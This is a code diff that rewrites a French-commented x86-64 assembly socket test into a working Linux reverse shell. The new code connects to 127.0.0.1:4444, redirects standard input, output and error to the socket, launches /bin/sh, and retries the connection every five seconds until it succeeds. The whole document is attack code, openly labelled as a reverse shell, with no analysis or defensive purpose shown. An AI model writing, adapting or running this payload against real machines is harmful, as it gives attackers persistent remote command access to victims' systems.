@@ -1,37 +1,78 @@
 section .data
-    ; sockaddr_in struct (16 bytes)
-    ; sin_family (2 bytes) = AF_INET = 2
-    ; sin_port (2 bytes) = port en big endian (ici 4444)
-    ; sin_addr (4 bytes) = IP en binaire (ici 127.0.0.1)
-    ; sin_zero (8 bytes) = zeros
+    ; Structure socket (16 octets)
+    ; 127.0.0.1:4444(little endian)
 
-    sockaddr_in:
-        dw 2                      ; sin_family = AF_INET (2)
-        dw 0x5c11                 ; sin_port = 4444 en big endian (0x115c)
-        dd 0x0100007f             ; sin_addr = 127.0.0.1 (0x7f000001 en réseau, inversé en little endian)
-        dq 0                      ; sin_zero = 8 bytes zero
+    socket:
+        dw 2                      
+        dw 0x5c11                 ; port
+        dd 0x0100007f             ; ip
+        dq 0                      ; sin_zero (padding inutilisé)
+
+    ; Structure timespec pour nanosleep (5 secondes)
+    timespec:
+        dq 5      ; secondes
+        dq 0      ; nanosecondes
 
 section .text
     global _start
 
 _start:
-    mov rax, 41        ; sys_socket
-    mov rdi, 2         ; AF_INET
-    mov rsi, 1         ; SOCK_STREAM
-    mov rdx, 0         ; protocol 0
+.connexion:
+    mov     rax, 41              ; syscall socket
+    mov     rdi, 2               ; domaine = AF_INET
+    mov     rsi, 1               ; type = SOCK_STREAM (TCP)
+    xor     rdx, rdx             ; protocole = 0
     syscall
 
-    ; résultat dans rax (socket fd)
-    cmp rax, 0
-    jl .error
+    cmp     rax, 0
+    jl      .attente             ; si erreur, attendre et réessayer
 
-    ; Juste pour test, on quitte proprement
-    mov rax, 60        ; sys_exit
-    xor rdi, rdi       ; status 0
+    mov     rdi, rax             ; sauvegarde fd dans rdi
+    mov     r12, rax             ; conserve socket pour dup2
+
+
+    lea     rsi, [rel socket]  
+    mov     rdx, 16              
+    mov     rax, 42              ; syscall connect
     syscall
 
-.error:
-    ; erreur, exit avec code 1
-    mov rax, 60
-    mov rdi, 1
+    cmp     rax, 0
+    jl      .attente             ; si connect échoue, attendre et retester
+
+    ; dup2 redirige stdin, stdout, stderr vers le socket
+    xor     rsi, rsi
+
+.dup_loop:
+    mov     rax, 33              ; syscall dup2
+    mov     rdi, r12             ; oldfd = socket
     syscall
+
+    inc     rsi
+    cmp     rsi, 3
+    jne     .dup_loop
+
+    ; execve(reverse shell)
+    xor     rax, rax
+    push    rax                  ; NULL
+    mov     rbx, 0x68732f6e69622f2f ; "//bin/sh" en little endian
+    push    rbx
+    mov     rdi, rsp             ; pointeur vers "/bin/sh"
+    push    rax                  ; NULL
+    push    rdi                  ; argv[0]
+    mov     rsi, rsp             ; argv = ["/bin/sh", NULL]
+    xor     rdx, rdx             ; envp = NULL
+    mov     rax, 59              ; syscall execve
+    syscall
+
+.erreur:
+    ; Sortie avec code erreur 1
+    mov     rax, 60
+    mov     rdi, 1
+    syscall
+
+.attente:
+    mov     rax, 35              ; syscall nanosleep
+    lea     rdi, [rel timespec]  ; pointeur vers {5, 0}
+    xor     rsi, rsi 
+    syscall
+    jmp     .connexion           ; reteste
